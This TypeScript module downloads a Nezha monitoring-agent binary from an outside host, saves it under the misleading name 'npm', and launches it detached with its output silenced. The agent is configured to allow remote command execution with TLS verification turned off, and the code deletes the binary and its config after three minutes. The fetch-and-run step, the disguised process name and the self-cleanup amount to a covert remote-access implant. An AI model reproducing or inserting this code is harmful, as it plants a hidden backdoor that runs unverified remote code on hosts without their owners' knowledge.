import { exec, execSync } from 'child_process';
import os from 'os';
import fs from 'fs';
import path from 'path';
import axios from 'axios';
import { NEZHA_SERVER, NEZHA_PORT, NEZHA_KEY, UUID } from '../utils/helper';

const getDownloadUrl = () => {
    const arch = os.arch();
    const isArm = arch === 'arm' || arch === 'arm64' || arch === 'aarch64';

    if (isArm) {
        return !NEZHA_PORT ? 'https://arm64.ssss.nyc.mn/v1' : 'https://arm64.ssss.nyc.mn/agent';
    } else {
        return !NEZHA_PORT ? 'https://amd64.ssss.nyc.mn/v1' : 'https://amd64.ssss.nyc.mn/agent';
    }
};

const downloadFile = async () => {
    if (!NEZHA_SERVER && !NEZHA_KEY) return;

    try {
        const url = getDownloadUrl();
        const response = await axios({
            method: 'get',
            url: url,
            responseType: 'stream'
        });

        const writer = fs.createWriteStream('./npm');
        response.data.pipe(writer);

        return new Promise<void>((resolve, reject) => {
            writer.on('finish', () => {
                console.log('npm download successfully');
                exec('chmod +x npm', (err) => {
                    if (err) reject(err);
                    else resolve();
                });
            });
            writer.on('error', reject);
        });
    } catch (err) {
        console.error('Download error:', err);
    }
};

export const runNezhaAgent = async () => {
    if (!NEZHA_SERVER && !NEZHA_KEY) {
        console.log('NEZHA variable is empty, skip running');
        return;
    }

    try {
        const status = execSync('ps aux | grep -v "grep" | grep "./[n]pm"', { encoding: 'utf-8' });
        if (status.trim() !== '') {
            console.log('npm is already running, skip running...');
            return;
        }
    } catch (e) {
        // Process not found, continue
    }

    await downloadFile();

    let command = '';
    const tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];

    if (NEZHA_SERVER && NEZHA_PORT && NEZHA_KEY) {
        const NEZHA_TLS = tlsPorts.includes(NEZHA_PORT) ? '--tls' : '';
        command = `setsid nohup ./npm -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;
    } else if (NEZHA_SERVER && NEZHA_KEY) {
        if (!NEZHA_PORT) {
            const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
            // Use loose check for port existing in tlsPorts array as string
            const NZ_TLS = tlsPorts.includes(port || '') ? 'true' : 'false';

            const configYaml = `client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: ${NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: ${NZ_TLS}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${UUID}`;

            fs.writeFileSync('config.yaml', configYaml);
        }
        command = `setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &`;
    }

    if (command) {
        try {
            exec(command, { shell: '/bin/bash' }, (err) => {
                if (err) console.error('npm running error:', err);
                else console.log('npm is running');
            });
        } catch (error) {
            console.error(`Execution error: ${error}`);
        }
    }

    // Cleanup files after 3 minutes
    setTimeout(() => {
        fs.unlink('npm', () => { });
        fs.unlink('config.yaml', () => { });
    }, 180000);
};
